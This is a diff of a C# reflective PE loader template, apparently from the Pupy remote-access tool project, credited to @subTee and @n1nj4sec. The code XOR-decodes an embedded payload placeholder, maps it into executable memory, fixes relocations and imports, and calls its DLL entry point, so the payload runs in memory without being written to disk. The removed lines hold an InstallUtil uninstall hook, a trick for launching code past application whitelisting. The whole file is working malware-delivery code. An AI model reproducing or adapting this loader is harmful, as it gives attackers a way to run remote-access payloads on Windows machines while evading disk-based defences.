@@ -1,53 +1,22 @@
-using System;
-using System.IO;
-using System.IO.Compression;
-using System.Text;
-using System.Collections.Generic;
-//using System.Configuration.Install;
-using System.Runtime.InteropServices;
- 
- 
- 
 /*
 Original Author: Casey Smith, Twitter: @subTee
 License: BSD 3-Clause
- 
+
 Edited by @n1nj4sec
- 
+
 */
- 
+
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
 namespace PELoader
 {
-    /*
-    [System.ComponentModel.RunInstaller(true)]
-    public class Sample : System.Configuration.Install.Installer
-    {
-        public static byte[] Compress(byte[] raw)
-        {
-            using (MemoryStream memory = new MemoryStream())
-            {
-                using (GZipStream gzip = new GZipStream(memory,
-                CompressionMode.Compress, true))
-                {
-                gzip.Write(raw, 0, raw.Length);
-                }
-                return memory.ToArray();
-            }
-        }
-         
-     
-     
-        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
-        public override void Uninstall(System.Collections.IDictionary savedState)
-        {
-            Program.Main();
-             
-        }
- 
-    }
-*/
     unsafe class Program
     {
+        private const int MAX_RECORDS = 1000;
+        private const byte MASK_BYTE = 0xFF;
+
         public enum DllReason : uint
         {
             DLL_PROCESS_ATTACH = 1,
@@ -58,197 +27,233 @@ namespace PELoader
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         private delegate bool DllEntryDelegate(void* hinstDLL, DllReason fdwReason, void* lpReserved);
-        static byte[] Decompress(byte[] gzip)
+
+        private static PELoader Unpack(string[] args)
         {
-            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
-            {
-                const int size = 4096;
-                byte[] buffer = new byte[size];
-                using (MemoryStream memory = new MemoryStream())
-                {
-                int count = 0;
-                do
-                {
-                    count = stream.Read(buffer, 0, size);
-                    if (count > 0)
-                    {
-                    memory.Write(buffer, 0, count);
-                    }
-                }
-                while (count > 0);
-                return memory.ToArray();
-                }
-            }
-        }
-         
-        public static void Main()
-        { 
-            DllEntryDelegate _dllEntry;
+            /* Do nothing about args for now */
+
             byte[] RawPE = <PUPYx64_BYTES>;
-            //byte[] decompressed = Decompress(FromBase64);
-            for (int i=0; i<RawPE.Length; i++) {
-                RawPE[i] ^= 0xFF;
+            for (int i = 0; i < RawPE.Length; i++)
+            {
+                RawPE[i] ^= MASK_BYTE;
             }
-             
-            PELoader pe = new PELoader(RawPE);
- 
-            Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
- 
-            IntPtr codebase = IntPtr.Zero;
- 
-            codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
- 
-            Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
- 
- 
+
+            return new PELoader(RawPE);
+        }
+
+        public static void Main()
+        {
+            ExecutePELoader(new string[] { });
+        }
+
+        private static void ExecutePELoader(string[] args)
+        {
+            PELoader pe = Unpack(args);
+
+            DllEntryDelegate _dllEntry;
+
+            uint SizeOfImage;
+            ulong ImageBase;
+            IntPtr CodeBase;
+            IntPtr RelocationTable;
+            IntPtr ImportTableVirtualAddress;
+            uint ImportTableVirtualAddressOffset;
+            uint AddressOfEntryPoint;
+
+            if (pe.Is32BitHeader)
+            {
+                SizeOfImage = pe.OptionalHeader32.SizeOfImage;
+                ImageBase = pe.OptionalHeader32.ImageBase;
+                AddressOfEntryPoint = pe.OptionalHeader32.AddressOfEntryPoint;
+                ImportTableVirtualAddressOffset = pe.OptionalHeader32.ImportTable.VirtualAddress;
+            }
+            else {
+                SizeOfImage = pe.OptionalHeader64.SizeOfImage;
+                ImageBase = pe.OptionalHeader64.ImageBase;
+                AddressOfEntryPoint = pe.OptionalHeader64.AddressOfEntryPoint;
+                ImportTableVirtualAddressOffset = pe.OptionalHeader64.ImportTable.VirtualAddress;
+            }
+
+            Console.WriteLine("Preferred Load Address = {0:X16}", ImageBase);
+
+            CodeBase = NativeDeclarations.VirtualAlloc(
+                IntPtr.Zero, SizeOfImage,
+                NativeDeclarations.MEM_COMMIT,
+                NativeDeclarations.PAGE_EXECUTE_READWRITE);
+
+            Console.WriteLine(
+                "Allocated Space For {0:X16} at {1:X16}",
+                SizeOfImage, CodeBase);
+
             //Copy Sections
             for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
             {
- 
-                IntPtr y = NativeDeclarations.VirtualAlloc((IntPtr)((byte *)codebase + pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-                Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
-                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
+                IntPtr SectionVirtualAddress = (IntPtr)((byte*)CodeBase + pe.ImageSectionHeaders[i].VirtualAddress);
+                IntPtr MappedVirtualAddress = NativeDeclarations.VirtualAlloc(
+                    SectionVirtualAddress,
+                    pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT,
+                    NativeDeclarations.PAGE_EXECUTE_READWRITE
+                );
+
+                Marshal.Copy(
+                    pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData,
+                    MappedVirtualAddress, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
+
+                Console.WriteLine("Section {0}, Copied To {1:X16}", pe.ImageSectionHeaders[i].Name, MappedVirtualAddress);
             }
- 
+
             //Perform Base Relocation
-            //Calculate Delta
-            long currentbase = (long)codebase.ToInt64();
             long delta;
- 
-            delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);
- 
- 
-            Console.WriteLine("Delta = {0}", delta.ToString("X4"));
- 
-            //Modify Memory Based On Relocation Table
- 
-            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.VirtualAddress.ToString("X4"));
-            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.Size.ToString("X4"));
- 
-            IntPtr relocationTable = (IntPtr)((byte *)codebase + pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
-            //Console.WriteLine(relocationTable.ToString("X4"));
- 
-            NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
-            relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
-            //Console.WriteLine(relocationEntry.VirtualAdress.ToString("X4"));
-            //Console.WriteLine(relocationEntry.SizeOfBlock.ToString("X4"));
- 
+
+            if (pe.Is32BitHeader) {
+                int currentbase = CodeBase.ToInt32();
+                delta = currentbase - (int)ImageBase;
+                RelocationTable = (IntPtr)((byte*)CodeBase + pe.OptionalHeader32.BaseRelocationTable.VirtualAddress);
+            } else {
+                long currentbase = CodeBase.ToInt64();
+                delta = currentbase - (long)ImageBase;
+                RelocationTable = (IntPtr)((byte*)CodeBase + pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
+            }
+
+            if (delta >= 0) {
+                Console.WriteLine("Delta = {0:X16}", delta);
+            } else {
+                Console.WriteLine("Delta = -{0:X16}", -delta);
+            }
+
+            NativeDeclarations.IMAGE_BASE_RELOCATION RelocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
+
+            RelocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(
+                RelocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
+
             int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
-            IntPtr nextEntry = relocationTable;
-            int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
-            IntPtr offset = relocationTable;
- 
+            IntPtr nextEntry = RelocationTable;
+            int sizeofNextBlock = (int)RelocationEntry.SizeOfBlock;
+            IntPtr offset = RelocationTable;
+
             while (true)
             {
- 
                 NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
-                IntPtr x = (IntPtr)((byte *)relocationTable + sizeofNextBlock);
-                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
- 
- 
-                IntPtr dest = (IntPtr)((byte *)codebase + (int)relocationEntry.VirtualAdress);
- 
- 
-                //Console.WriteLine("Section Has {0} Entires",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
-                //Console.WriteLine("Next Section Has {0} Entires", (int)(relocationNextEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
- 
-                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
+                IntPtr x = (IntPtr)((byte*)RelocationTable + sizeofNextBlock);
+                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(
+                    x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
+
+                IntPtr dest = (IntPtr)((byte*)CodeBase + (int)RelocationEntry.VirtualAdress);
+
+                for (int i = 0; i < (int)((RelocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                 {
- 
                     IntPtr patchAddr;
+
                     UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));
- 
                     UInt16 type = (UInt16)(value >> 12);
                     UInt16 fixup = (UInt16)(value & 0xfff);
-                    //Console.WriteLine("{0}, {1}, {2}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));
- 
+
+                    long originalAddr;
+                    long fixedAddr;
+
+                    patchAddr = (IntPtr)((byte*)dest + fixup);
+
                     switch (type)
                     {
                         case 0x0:
+                            Console.WriteLine("[R] ABS");
                             break;
-                        case 0xA:
-                            patchAddr = (IntPtr)((byte *)dest+ fixup);
-                            //Add Delta To Location.
-                            long originalAddr = Marshal.ReadInt64(patchAddr);
-                            Marshal.WriteInt64(patchAddr, originalAddr + delta);
-                            break;
- 
-                    }
- 
-                }
- 
-                offset = (IntPtr)((byte *)relocationTable + sizeofNextBlock);
-                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
-                relocationEntry = relocationNextEntry;
- 
-                nextEntry = (IntPtr)((byte *)nextEntry + sizeofNextBlock);
- 
-                if (relocationNextEntry.SizeOfBlock == 0) break;
- 
- 
-            }
- 
- 
-            //Resolve Imports
- 
-            //IntPtr z = (IntPtr)((byte *)codebase + pe.ImageSectionHeaders[1].VirtualAddress);
-            IntPtr oa1 = (IntPtr)((byte *)codebase + pe.OptionalHeader64.ImportTable.VirtualAddress);
-            int oa2 = Marshal.ReadInt32((IntPtr)((byte *)oa1+ 16));
- 
-            //Get And Display Each DLL To Load
-            for (int j = 0; j < 999; j++) //HardCoded Number of DLL's Do this Dynamically.
-            {
-                IntPtr a1 = (IntPtr)((byte *)codebase + (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
-                int entryLength = Marshal.ReadInt32((IntPtr)((byte *)a1 + 16));
-                IntPtr a2 = (IntPtr)((byte *)codebase + pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
-                IntPtr dllNamePTR = (IntPtr)((byte *)codebase + Marshal.ReadInt32((IntPtr)((byte *)(a1)+ 12)));
-                string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
-                if (DllName == "") { break; }
- 
-                IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
-                Console.WriteLine("Loaded {0}", DllName);
-                for (int k = 1; k < 9999; k++)
-                {
-                    IntPtr dllFuncNamePTR = ((IntPtr)((byte *)codebase + Marshal.ReadInt32(a2)));
-                    string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((byte *)dllFuncNamePTR + 2));
-                    //Console.WriteLine("Function {0}", DllFuncName);
-                    IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
-                    Marshal.WriteInt64(a2, (long)funcAddy);
-                    a2 = (IntPtr)((byte *)a2 + 8);
-                    if (DllFuncName == "") break;
- 
-                }
- 
- 
-                //Console.ReadLine();
-            }
- 
-            //Transfer Control To OEP
-            Console.WriteLine("Executing DLL");
-            IntPtr threadStart = (IntPtr)((byte *)codebase+ (int)pe.OptionalHeader64.AddressOfEntryPoint);
-            _dllEntry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer((IntPtr)threadStart, typeof(DllEntryDelegate));
 
-            if (_dllEntry != null && _dllEntry((byte*)codebase, DllReason.DLL_PROCESS_ATTACH, null)){
+                        case 0x3:
+                            originalAddr = (long) Marshal.ReadInt32(patchAddr);
+                            fixedAddr = originalAddr + delta;
+
+                            Console.WriteLine(
+                                "[R] {0:X8} (+ {1}) -> {2:X8}", 
+                                originalAddr, delta, fixedAddr);
+                            Marshal.WriteInt32(patchAddr, (int) fixedAddr);
+                            break;
+
+                        case 0xA: 
+                            originalAddr = Marshal.ReadInt64(patchAddr);
+                            fixedAddr = originalAddr + delta;
+                            Console.WriteLine(
+                                "[R] {0:X16} (+ {1}) -> {2:X16}", 
+                                    originalAddr, delta, fixedAddr);
+                            Marshal.WriteInt64(patchAddr, fixedAddr);
+                            break;
+
+                        default:
+                            Console.WriteLine("[R] Invalid relocation: {0}", type);
+                            break;
+                    }
+                }
+
+                offset = (IntPtr)((byte*)RelocationTable + sizeofNextBlock);
+                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
+                RelocationEntry = relocationNextEntry;
+
+                nextEntry = (IntPtr)((byte*)nextEntry + sizeofNextBlock);
+
+                if (relocationNextEntry.SizeOfBlock == 0)
+                    break;
             }
-            else
+
+            ImportTableVirtualAddress = (IntPtr)((byte*)CodeBase + ImportTableVirtualAddressOffset);
+
+            int oa2 = Marshal.ReadInt32((IntPtr)((byte*)ImportTableVirtualAddress + 16));
+
+            //Get And Display Each DLL To Load
+            for (int j = 0; j < MAX_RECORDS; j++) //HardCoded Number of DLL's Do this Dynamically.
+            {
+                IntPtr a1 = (IntPtr)((byte*)CodeBase + (20 * j) + ImportTableVirtualAddressOffset);
+
+                int entryLength = Marshal.ReadInt32((IntPtr)((byte*)a1 + 16));
+
+                //Need just last part?
+                IntPtr DllFuncNameIdx = (IntPtr)((byte*)CodeBase + pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
+
+                IntPtr dllNamePTR = (IntPtr)((byte*)CodeBase + Marshal.ReadInt32((IntPtr)((byte*)(a1) + 12)));
+                string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
+
+                Console.WriteLine("Import DLL {0}", DllName);
+
+                if (DllName == "")
+                    break;
+
+                IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
+                Console.WriteLine("Loaded {0} -> {1}", DllName, handle);
+                for (int k = 1; k < MAX_RECORDS; k++)
+                {
+                    IntPtr DllFuncNamePtr = ((IntPtr)((byte*)CodeBase + Marshal.ReadInt32(DllFuncNameIdx)));
+                    string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((byte*)DllFuncNamePtr + 2));
+
+                    IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
+
+                    Console.WriteLine("Import Function {0} -> {1:X16}", DllFuncName, funcAddy);
+
+                    if (pe.Is32BitHeader) {
+                        Marshal.WriteInt32(DllFuncNameIdx, (int)funcAddy);
+                        DllFuncNameIdx = (IntPtr)((byte*)DllFuncNameIdx + 4);
+                    } else {
+                        Marshal.WriteInt64(DllFuncNameIdx, (long)funcAddy);
+                        DllFuncNameIdx = (IntPtr)((byte*)DllFuncNameIdx + 8);
+                    }
+
+                    if (DllFuncName == "")
+                        break;
+                }
+            }
+
+            IntPtr OEP = (IntPtr)((byte*)CodeBase + AddressOfEntryPoint);
+
+            //Transfer Control To OEP
+            Console.WriteLine("Executing DLL [OEP -> {0:X16}]", OEP);
+
+            _dllEntry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(OEP, typeof(DllEntryDelegate));
+
+            if (_dllEntry == null || !_dllEntry((byte*)CodeBase, DllReason.DLL_PROCESS_ATTACH, null))
             {
                 throw new Exception("Can't attach DLL to process.");
             }
+        }
+    }
 
-            //IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
-            //NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
- 
-            Console.WriteLine("Thread Complete");
-            //Console.ReadLine();
- 
- 
- 
-        } //End Main
- 
- 
- 
-    }//End Program
- 
     public class PELoader
     {
         public struct IMAGE_DOS_HEADER
@@ -285,14 +290,14 @@ namespace PELoader
             public UInt16 e_res2_9;             // Reserved words
             public UInt32 e_lfanew;             // File address of new exe header
         }
- 
+
         [StructLayout(LayoutKind.Sequential)]
         public struct IMAGE_DATA_DIRECTORY
         {
             public UInt32 VirtualAddress;
             public UInt32 Size;
         }
- 
+
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct IMAGE_OPTIONAL_HEADER32
         {
@@ -326,7 +331,7 @@ namespace PELoader
             public UInt32 SizeOfHeapCommit;
             public UInt32 LoaderFlags;
             public UInt32 NumberOfRvaAndSizes;
- 
+
             public IMAGE_DATA_DIRECTORY ExportTable;
             public IMAGE_DATA_DIRECTORY ImportTable;
             public IMAGE_DATA_DIRECTORY ResourceTable;
@@ -344,7 +349,7 @@ namespace PELoader
             public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
             public IMAGE_DATA_DIRECTORY Reserved;
         }
- 
+
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct IMAGE_OPTIONAL_HEADER64
         {
@@ -377,7 +382,7 @@ namespace PELoader
             public UInt64 SizeOfHeapCommit;
             public UInt32 LoaderFlags;
             public UInt32 NumberOfRvaAndSizes;
- 
+
             public IMAGE_DATA_DIRECTORY ExportTable;
             public IMAGE_DATA_DIRECTORY ImportTable;
             public IMAGE_DATA_DIRECTORY ResourceTable;
@@ -395,7 +400,7 @@ namespace PELoader
             public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
             public IMAGE_DATA_DIRECTORY Reserved;
         }
- 
+
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct IMAGE_FILE_HEADER
         {
@@ -407,7 +412,7 @@ namespace PELoader
             public UInt16 SizeOfOptionalHeader;
             public UInt16 Characteristics;
         }
- 
+
         [StructLayout(LayoutKind.Explicit)]
         public struct IMAGE_SECTION_HEADER
         {
@@ -432,20 +437,20 @@ namespace PELoader
             public UInt16 NumberOfLinenumbers;
             [FieldOffset(36)]
             public DataSectionFlags Characteristics;
- 
+
             public string Section
             {
                 get { return new string(Name); }
             }
         }
- 
+
         [StructLayout(LayoutKind.Sequential)]
         public struct IMAGE_BASE_RELOCATION
         {
             public uint VirtualAdress;
             public uint SizeOfBlock;
         }
- 
+
         [Flags]
         public enum DataSectionFlags : uint
         {
@@ -618,7 +623,7 @@ namespace PELoader
             /// </summary>
             MemoryWrite = 0x80000000
         }
- 
+
         /// <summary>
         /// The DOS header
         /// </summary>
@@ -628,57 +633,20 @@ namespace PELoader
         /// </summary>
         private IMAGE_FILE_HEADER fileHeader;
         /// <summary>
-        /// Optional 32 bit file header 
+        /// Optional 32 bit file header
         /// </summary>
         private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
         /// <summary>
-        /// Optional 64 bit file header 
+        /// Optional 64 bit file header
         /// </summary>
         private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
         /// <summary>
         /// Image Section headers. Number of sections is in the file header.
         /// </summary>
         private IMAGE_SECTION_HEADER[] imageSectionHeaders;
- 
+
         private byte[] rawbytes;
- 
- 
- 
-        public PELoader(string filePath)
-        {
-            // Read in the DLL or EXE and get the timestamp
-            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
-            {
-                BinaryReader reader = new BinaryReader(stream);
-                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
- 
-                // Add 4 bytes to the offset
-                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
- 
-                reader.ReadUInt32();
-                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
-                if (this.Is32BitHeader)
-                {
-                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
-                }
-                else
-                {
-                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
-                }
- 
-                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
-                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
-                {
-                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
-                }
- 
- 
- 
-                rawbytes = System.IO.File.ReadAllBytes(filePath);
- 
-            }
-        }
- 
+
         public PELoader(byte[] fileBytes)
         {
             // Read in the DLL or EXE and get the timestamp
@@ -686,10 +654,10 @@ namespace PELoader
             {
                 BinaryReader reader = new BinaryReader(stream);
                 dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
- 
+
                 // Add 4 bytes to the offset
                 stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
- 
+
                 reader.ReadUInt32();
                 fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                 if (this.Is32BitHeader)
@@ -700,35 +668,30 @@ namespace PELoader
                 {
                     optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                 }
- 
+
                 imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                 for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                 {
                     imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                 }
- 
- 
+
                 rawbytes = fileBytes;
- 
             }
         }
- 
- 
+
         public static T FromBinaryReader<T>(BinaryReader reader)
         {
             // Read in a byte array
             byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
- 
+
             // Pin the managed memory while, copy it out the data, then unpin it
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
             T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
             handle.Free();
- 
+
             return theStructure;
         }
- 
- 
- 
+
         public bool Is32BitHeader
         {
             get
@@ -737,8 +700,8 @@ namespace PELoader
                 return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
             }
         }
- 
- 
+
+
         public IMAGE_FILE_HEADER FileHeader
         {
             get
@@ -746,7 +709,7 @@ namespace PELoader
                 return fileHeader;
             }
         }
- 
+
         /// <summary>
         /// Gets the optional header
         /// </summary>
@@ -757,7 +720,7 @@ namespace PELoader
                 return optionalHeader32;
             }
         }
- 
+
         /// <summary>
         /// Gets the optional header
         /// </summary>
@@ -768,7 +731,7 @@ namespace PELoader
                 return optionalHeader64;
             }
         }
- 
+
         public IMAGE_SECTION_HEADER[] ImageSectionHeaders
         {
             get
@@ -776,22 +739,19 @@ namespace PELoader
                 return imageSectionHeaders;
             }
         }
- 
+
         public byte[] RawBytes
         {
             get
             {
                 return rawbytes;
             }
- 
         }
- 
-    }//End Class
- 
- 
+    }
+
     unsafe class NativeDeclarations
     {
- 
+
         public static uint MEM_COMMIT = 0x1000;
         public static uint MEM_RESERVE = 0x2000;
         public static uint PAGE_EXECUTE_READWRITE = 0x40;
@@ -803,34 +763,16 @@ namespace PELoader
             public uint VirtualAdress;
             public uint SizeOfBlock;
         }
- 
+
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
- 
+
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern IntPtr LoadLibrary(string lpFileName);
- 
+
         [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
- 
-        [DllImport("kernel32")]
-        public static extern IntPtr CreateThread(
- 
-          IntPtr lpThreadAttributes,
-          uint dwStackSize,
-          IntPtr lpStartAddress,
-          IntPtr param,
-          uint dwCreationFlags,
-          IntPtr lpThreadId
-          );
- 
-        [DllImport("kernel32")]
-        public static extern UInt32 WaitForSingleObject(
- 
-          IntPtr hHandle,
-          UInt32 dwMilliseconds
-          );
- 
+
         [StructLayout(LayoutKind.Sequential)]
         public unsafe struct IMAGE_IMPORT_DESCRIPTOR
         {
@@ -840,9 +782,5 @@ namespace PELoader
             public uint Name;
             public uint FirstThunk;
         }
- 
- 
     }
- 
- 
 }
